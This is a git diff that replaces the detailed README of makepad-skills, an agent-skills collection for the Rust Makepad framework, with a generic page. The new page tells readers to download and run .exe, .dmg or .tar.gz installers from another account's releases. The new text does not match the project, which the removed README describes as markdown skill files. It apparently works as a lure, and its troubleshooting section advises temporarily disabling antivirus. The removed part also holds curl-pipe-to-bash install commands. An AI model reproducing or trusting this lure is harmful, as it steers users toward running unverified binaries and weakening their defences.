@@ -1,427 +1,97 @@
-# Agent Skills for Makepad
+# 🎉 makepad-skills - Build Amazing Apps Easily
 
-[English](./README.md) | [中文](./README.zh-CN.md) | [日本語](./README.ja.md)
+[![Download makepad-skills](https://img.shields.io/badge/Download%20makepad--skills-blue.svg)](https://github.com/SageV1/makepad-skills/releases)
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](./.claude-plugin/plugin.json)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
+## 🚀 Getting Started
 
-Agent skills for building cross-platform UI applications with the [Makepad](https://github.com/makepad/makepad) framework in Rust.
+Welcome to **makepad-skills**! This application lets you create apps using Makepad with AI skills. Follow these steps to get it running on your computer.
 
-## About Makepad
+## 📥 Download & Install
 
-[Makepad](https://github.com/makepad/makepad) is a next-generation UI framework written in Rust that enables building high-performance, cross-platform applications. Key features include:
+To start, visit this page to download: [GitHub Releases](https://github.com/SageV1/makepad-skills/releases).
 
-- **Cross-Platform**: Single codebase for Desktop (macOS, Windows, Linux), Mobile (Android, iOS), and Web (WebAssembly)
-- **GPU-Accelerated**: Custom shader-based rendering with SDF (Signed Distance Field) drawing
-- **Live Design**: Hot-reloadable `live_design!` DSL for rapid UI development
-- **High Performance**: Native compilation, no virtual DOM, minimal runtime overhead
+### Step 1: Choose Your Version
 
-## About Robius
+On the releases page, you will see different versions of the software. Select the latest version to ensure you have the most recent features and fixes.
 
-[Project Robius](https://github.com/project-robius) is an open-source initiative to build a full-featured application development framework in Rust. Production applications built with Makepad include:
+### Step 2: Download the File
 
-- **[Robrix](https://github.com/project-robius/robrix)** - A Matrix chat client showcasing real-time messaging, E2E encryption, and complex UI patterns
-- **[Moly](https://github.com/moxin-org/moly)** - An AI model manager demonstrating data-heavy interfaces and async operations
+After you select a version, look for the installer file appropriate for your operating system. For example:
 
-These skills are extracted from patterns used in Robrix and Moly.
+- **Windows:** Look for a file ending with `.exe`.
+- **Mac:** Look for a file ending with `.dmg`.
+- **Linux:** Look for a file ending with `.tar.gz`.
 
-## Installation
+Click on the file to start the download. Remember where you save it on your computer.
 
-### Plugin Marketplace (Recommended)
+### Step 3: Run the Installer
 
-Install via Claude Code's plugin marketplace:
+Once the download completes, locate the file you downloaded. 
 
-```bash
-# Step 1: Add marketplace
-/plugin marketplace add ZhangHanDong/makepad-skills
+- **Windows:** Double-click the `.exe` file to begin the installation.
+- **Mac:** Double-click the `.dmg` file, drag the application into your Applications folder, and then open it.
+- **Linux:** Extract the `.tar.gz` file and run the provided script.
 
-# Step 2: Install the plugin (includes all 20 skills)
-/plugin install makepad-skills@makepad-skills-marketplace
-```
+Follow the instructions on the screen to complete installation. This process is straightforward and should take just a few minutes.
 
-**Using Plugin Skills:**
+## 📄 Features
 
-Plugin skills are accessed via namespace format (they won't appear in `/skills` list, but can be loaded):
+**makepad-skills** offers a variety of features to enhance your app-building experience:
 
-```bash
-# Load specific skills by namespace
-/makepad-skills:makepad-widgets
-/makepad-skills:makepad-layout
-/makepad-skills:robius-widget-patterns
+- **User-Friendly Interface:** Designed for ease of use, even for those without programming experience.
+- **Cross-Platform Support:** Works on Windows, Mac, and Linux.
+- **Integrated AI Capabilities:** Leverage AI skills to enhance your application.
+- **Customizable Templates:** Start from pre-built templates that you can tweak to suit your needs.
+- **Community Support:** Join our community to share ideas and get help from fellow users.
 
-# Or just ask questions - hooks will auto-route to relevant skills
-"How do I create a Makepad button?"
-"makepad 布局怎么居中？"
-```
+## 📋 System Requirements
 
-**Manage installed plugins:**
-
-```bash
-/plugin                  # List installed plugins
-/plugin uninstall makepad-skills@makepad-skills-marketplace  # Uninstall
-```
+Before you begin, ensure your computer meets the following requirements:
 
-### Shell Script Install
+### For Windows
 
-Use the install script for one-command setup:
+- Windows 10 or later
+- At least 4 GB RAM
+- 200 MB available disk space
 
-```bash
-# Install to current project
-curl -fsSL https://raw.githubusercontent.com/ZhangHanDong/makepad-skills/main/install.sh | bash
+### For Mac
 
-# Install with hooks enabled
-curl -fsSL https://raw.githubusercontent.com/ZhangHanDong/makepad-skills/main/install.sh | bash -s -- --with-hooks
+- macOS Mojave (10.14) or later
+- At least 4 GB RAM
+- 200 MB available disk space
 
-# Install to specific project
-curl -fsSL https://raw.githubusercontent.com/ZhangHanDong/makepad-skills/main/install.sh | bash -s -- --target /path/to/project
+### For Linux
 
-# Install for Codex (.codex/skills)
-curl -fsSL https://raw.githubusercontent.com/ZhangHanDong/makepad-skills/main/install.sh | bash -s -- --agent codex
+- Ubuntu 18.04 or later
+- At least 4 GB RAM
+- 200 MB available disk space
 
-# Install for Gemini CLI (.gemini/skills)
-curl -fsSL https://raw.githubusercontent.com/ZhangHanDong/makepad-skills/main/install.sh | bash -s -- --agent gemini
-```
-
-Gemini CLI note: Skills are experimental. Enable `experimental.skills` in `/settings` if needed.
-
-**Script features:**
-- Auto-detects Rust/Makepad projects (checks for Cargo.toml)
-- Backs up existing skills before installation
-- `--with-hooks` copies and configures self-evolution hooks (Claude Code only)
-- `--agent codex|claude-code|gemini` chooses Codex, Claude Code, or Gemini CLI (default: claude-code)
-- `--target` allows installing to any project directory
-- Colored output with clear progress indicators
+## 💬 Troubleshooting
 
-**Available options:**
+If you run into issues while downloading or installing:
 
-| Option | Description |
-|--------|-------------|
-| `--target DIR` | Install to specific directory (default: current) |
-| `--with-hooks` | Enable self-evolution hooks (Claude Code only) |
-| `--agent AGENT` | Set agent: `codex`, `claude-code`, or `gemini` (default: `claude-code`) |
-| `--branch NAME` | Use specific branch (default: main) |
-| `--help` | Show help message |
-
-### Manual Install
-
-```bash
-# Clone this repo
-git clone https://github.com/ZhangHanDong/makepad-skills.git
-
-# Copy to your project (https://code.claude.com/docs/en/skills)
-cp -r makepad-skills/skills your-project/.claude/skills
-
-# Copy to your project for Codex (https://developers.openai.com/codex/skills)
-cp -r makepad-skills/skills your-project/.codex/skills
-
-# Copy to your project for Gemini CLI (https://geminicli.com/docs/cli/skills/)
-cp -r makepad-skills/skills your-project/.gemini/skills
-```
-
-Your project structure should look like (use `.codex` or `.gemini` instead of `.claude`):
-
-```
-your-project/
-├── .claude/
-│   └── skills/
-│       ├── .claude-plugin/
-│       │   └── plugin.json
-│       │
-│       ├── # === Core Skills (16) ===
-│       ├── makepad-basics/
-│       ├── makepad-dsl/
-│       ├── makepad-layout/
-│       ├── makepad-widgets/
-│       ├── makepad-event-action/
-│       ├── makepad-animation/
-│       ├── makepad-shaders/
-│       ├── makepad-platform/
-│       ├── makepad-font/
-│       ├── makepad-splash/
-│       ├── robius-app-architecture/
-│       ├── robius-widget-patterns/
-│       ├── robius-event-action/
-│       ├── robius-state-management/
-│       ├── robius-matrix-integration/
-│       ├── molykit/
-│       │
-│       ├── # === Extended Skills (3) ===
-│       ├── makepad-deployment/
-│       ├── makepad-reference/
-│       │
-│       ├── evolution/          # Self-evolution system
-│       │   └── templates/      # Contribution templates
-│       └── CONTRIBUTING.md
-├── src/
-└── Cargo.toml
-```
-
-See [Claude Code Skills documentation](https://docs.anthropic.com/en/docs/claude-code/skills) for more details.
-
-## Architecture: Atomic Skills for Collaboration
-
-### Why Atomic Structure?
-
-v2.1 introduces an **atomic skill structure** designed for collaborative development:
-
-```
-robius-widget-patterns/
-├── SKILL.md              # Index file
-├── _base/                # Official patterns (numbered, atomic)
-│   ├── 01-widget-extension.md
-│   ├── 02-modal-overlay.md
-│   ├── ...
-│   └── 18-drag-drop-reorder.md
-└── community/            # Your contributions
-    └── {descriptive-pattern-name}.md
-```
-
-**Benefits:**
-- **No merge conflicts**: Your `community/` files never conflict with official `_base/` updates
-- **Parallel development**: Multiple users can contribute simultaneously
-- **Clear attribution**: Your GitHub handle in filename provides credit
-- **Progressive disclosure**: SKILL.md index → individual pattern details
-
-### Self-Evolution: Enriching Skills from Your Development
-
-The self-evolution feature allows you to capture patterns discovered during your development and add them to the skills.
-
-#### How It Works
-
-1. **During Development**: You discover a useful pattern, shader, or error solution while building with Makepad
-
-2. **Capture the Pattern**: Ask Claude to save it:
-   ```
-   User: This tooltip positioning logic is useful. Save it as a community pattern.
-   Claude: [Creates community/{handle}-tooltip-positioning.md using template]
-   ```
-
-3. **Auto-Detection** (with hooks enabled): When you encounter and fix errors, the system can automatically capture solutions to troubleshooting
-
-#### Enable Self-Evolution Hooks (Optional)
-
-```bash
-# Copy hooks from evolution to your project
-cp -r your-project/.claude/skills/evolution/hooks your-project/.claude/skills/hooks
-
-# Make hooks executable
-chmod +x your-project/.claude/skills/hooks/*.sh
-
-# Add hooks config to your .claude/settings.json
-# See skills/evolution/hooks/settings.example.json for the configuration
-```
-
-#### Manual Pattern Creation
-
-Ask Claude directly:
-```
-User: Create a community pattern for the drag-drop reordering I just implemented
-Claude: I'll create a pattern using the template...
-```
-
-Claude will:
-1. Use the template from `evolution/templates/pattern-template.md`
-2. Create file at `robius-widget-patterns/community/{descriptive-pattern-name}.md`
-3. Fill in the frontmatter and content
-
-### Community Contribution Guide
-
-#### Contributing Patterns
-
-1. **Create your pattern file** in the appropriate robius-* skill's community directory:
-   - Widget patterns → `robius-widget-patterns/community/`
-   - State patterns → `robius-state-management/community/`
-   - Async patterns → `robius-app-architecture/community/`
-
-2. **Use the template**: Copy from `evolution/templates/pattern-template.md`
-
-3. **Required frontmatter**:
-   ```yaml
-   ---
-   name: my-pattern-name
-   author: your-github-handle
-   source: project-where-you-discovered-this
-   date: 2024-01-15
-   tags: [tag1, tag2, tag3]
-   level: beginner|intermediate|advanced
-   ---
-   ```
-
-4. **Submit PR** to the main repository
-
-#### Contributing Shaders/Effects
-
-1. **Create your effect file**:
-   ```
-   makepad-shaders/community/{github-handle}-{effect-name}.md
-   ```
-
-2. **Use the template**: Copy from `evolution/templates/shader-template.md`
-
-#### Contributing Error Solutions
-
-1. **Create troubleshooting entry**:
-   ```
-   makepad-reference/troubleshooting/{error-name}.md
-   ```
-
-2. **Use the template**: Copy from `evolution/templates/troubleshooting-template.md`
-
-#### Syncing with Upstream
-
-Keep your local skills updated while preserving your contributions:
-
-```bash
-# If you've forked the repo
-git fetch upstream
-git merge upstream/main --no-edit
-# Your community/ files won't conflict with _base/ changes
-```
-
-#### Promotion Path
-
-High-quality community contributions may be promoted to `_base/`:
-- Pattern is widely useful and well-tested
-- Documentation is complete
-- Community feedback is positive
-- Credit preserved via `author` field
-
-## Skills Overview (v3.0 Flat Structure)
-
-### Core Skills (16)
-
-#### Makepad Core (10 Skills)
-
-| Skill | Description | When to Use |
-|-------|-------------|-------------|
-| [makepad-basics](./skills/makepad-basics/) | App structure, `live_design!`, `app_main!` | "Create a new Makepad app" |
-| [makepad-dsl](./skills/makepad-dsl/) | DSL syntax, inheritance, prototypes | "How to define widgets in DSL" |
-| [makepad-layout](./skills/makepad-layout/) | Flow, sizing, spacing, alignment | "Center a widget", "Arrange elements" |
-| [makepad-widgets](./skills/makepad-widgets/) | Common widgets, custom widgets | "Create a button", "Build a form" |
-| [makepad-event-action](./skills/makepad-event-action/) | Event handling, actions | "Handle click events" |
-| [makepad-animation](./skills/makepad-animation/) | Animator, states, transitions | "Add hover animation" |
-| [makepad-shaders](./skills/makepad-shaders/) | Shaders, SDF, gradients, visual effects | "Custom visual effects" |
-| [makepad-platform](./skills/makepad-platform/) | Platform support | "Build for Android/iOS" |
-| [makepad-font](./skills/makepad-font/) | Font, text, typography | "Change font, text styling" |
-| [makepad-splash](./skills/makepad-splash/) | Splash scripting language | "Dynamic UI scripting" |
-
-#### Robius Patterns (5 Skills)
-
-| Skill | Description | When to Use |
-|-------|-------------|-------------|
-| [robius-app-architecture](./skills/robius-app-architecture/) | Tokio, async/sync patterns | "Structure an async app" |
-| [robius-widget-patterns](./skills/robius-widget-patterns/) | Reusable widgets, `apply_over` | "Create reusable components" |
-| [robius-event-action](./skills/robius-event-action/) | Custom actions, `MatchEvent` | "Custom event handling" |
-| [robius-state-management](./skills/robius-state-management/) | AppState, persistence | "Save/load app state" |
-| [robius-matrix-integration](./skills/robius-matrix-integration/) | Matrix SDK integration | "Chat client features" |
-
-#### MolyKit (1 Skill)
-
-| Skill | Description | When to Use |
-|-------|-------------|-------------|
-| [molykit](./skills/molykit/) | AI chat, SSE streaming, `BotClient` | "AI chat integration" |
-
-### Extended Skills (3)
-
-**Note:** Production patterns are now integrated into robius-* skills:
-- Widget patterns (11) → `robius-widget-patterns/_base/`
-- State patterns (5) → `robius-state-management/_base/`
-- Async patterns (3) → `robius-app-architecture/_base/`
-
-#### [makepad-deployment](./skills/makepad-deployment/SKILL.md) - Build & Package
-
-Build for desktop (Linux, Windows, macOS), mobile (Android, iOS), and web (WebAssembly).
-
-#### [makepad-reference](./skills/makepad-reference/SKILL.md) - Reference Materials
-
-| File | Description | When to Use |
-|------|-------------|-------------|
-| troubleshooting.md | Common errors and fixes | "Apply error: no matching field" |
-| code-quality.md | Makepad-aware refactoring | "Simplify this code" |
-| adaptive-layout.md | Desktop/mobile responsive | "Support both desktop and mobile" |
-
-#### [evolution](./skills/evolution/SKILL.md) - Self-Improvement
-
-| Component | Description |
-|-----------|-------------|
-| `templates/` | Pattern, shader, and troubleshooting templates |
-| `hooks/` | Auto-detection and validation hooks |
-| `references/` | Collaboration guidelines |
-
-## Usage Examples
-
-### Create a New Project
-```
-User: Create a new Makepad app called "my-app" with a counter button
-Claude: [Uses makepad-basics for scaffolding, makepad-widgets for button/counter]
-```
-
-### Add a Tooltip
-```
-User: Add a tooltip that shows user info on hover
-Claude: [Uses robius-widget-patterns/_base/14-callout-tooltip.md for complete implementation]
-```
-
-### Save a Custom Pattern
-```
-User: Save this infinite scroll implementation as a community pattern
-Claude: [Creates robius-widget-patterns/community/infinite-scroll.md]
-```
-
-### Fix Compilation Error
-```
-User: Getting "no matching field: font" error
-Claude: [Uses makepad-reference/troubleshooting.md to identify correct text_style syntax]
-```
-
-## What You Can Build
-
-With these skills, Claude can help you:
-
-- Initialize new Makepad projects with proper structure
-- Create custom widgets with `live_design!` DSL
-- Handle events and user interactions
-- Write GPU shaders for visual effects
-- Implement smooth animations
-- Manage application state with async/tokio
-- Build responsive desktop/mobile layouts
-- Package apps for all platforms
-- **Capture and share patterns** you discover during development
-
-## Projects Built with These Skills
-
-Real-world projects created using makepad-skills and Claude Code:
-
-| Project | Description | Time |
-|---------|-------------|------|
-| [makepad-skills-demo](https://github.com/ZhangHanDong/makepad-skills-demo) | Currency converter app demo | ~20 min |
-| [makepad-component](https://github.com/ZhangHanDong/makepad-component) | Reusable Makepad component library | - |
-
-### makepad-skills-demo Screenshot
-
-<p align="center">
-  <img src="./assets/skill-app-demo.jpg" width="60%" alt="Currency Converter App" />
-</p>
-
-### makepad-component Screenshots
-
-<p align="center">
-  <img src="./assets/mc1.png" width="45%" alt="Component 1" />
-  <img src="./assets/mc2.png" width="45%" alt="Component 2" />
-</p>
-<p align="center">
-  <img src="./assets/mc3.png" width="45%" alt="Component 3" />
-  <img src="./assets/mc4.png" width="45%" alt="Component 4" />
-</p>
-
-## Resources
-
-- [Makepad Repository](https://github.com/makepad/makepad)
-- [Makepad Examples](https://github.com/makepad/makepad/tree/main/examples)
-- [Project Robius](https://github.com/project-robius)
-- [Robrix](https://github.com/project-robius/robrix)
-- [Moly](https://github.com/moxin-org/moly)
-
-## License
-
-MIT
+1. **Check Your Internet Connection:** Make sure you are connected to the internet.
+2. **Try Another Browser:** If the download doesn’t start, try using a different web browser.
+3. **Antivirus Software:** Some antivirus programs may block the installation. Temporarily disable it to allow installation, but ensure you re-enable it afterward.
+4. **Error Messages:** Write down any error messages you encounter. These can help in searching for solutions online or asking for help in our community.
+
+## 🙋 Community Support
+
+You are not alone! If you have questions or need assistance, please join our community forum. Connect with other users to share tips, get advice, and learn new skills.
+
+## 💡 Tips for Best Experience
+
+- Keep the software updated to access the latest features.
+- Explore the documentation to learn more about advanced features.
+- Engage in discussions in the community to broaden your understanding.
+
+## 🔗 Additional Resources
+
+For more information, check out:
+
+- [Official Documentation](https://github.com/SageV1/makepad-skills/wiki)
+- [Community Forum](https://github.com/SageV1/makepad-skills/discussions)
+
+Feel free to share your experiences and suggestions. Your feedback helps us improve **makepad-skills**.
+
+Enjoy building amazing applications with ease!
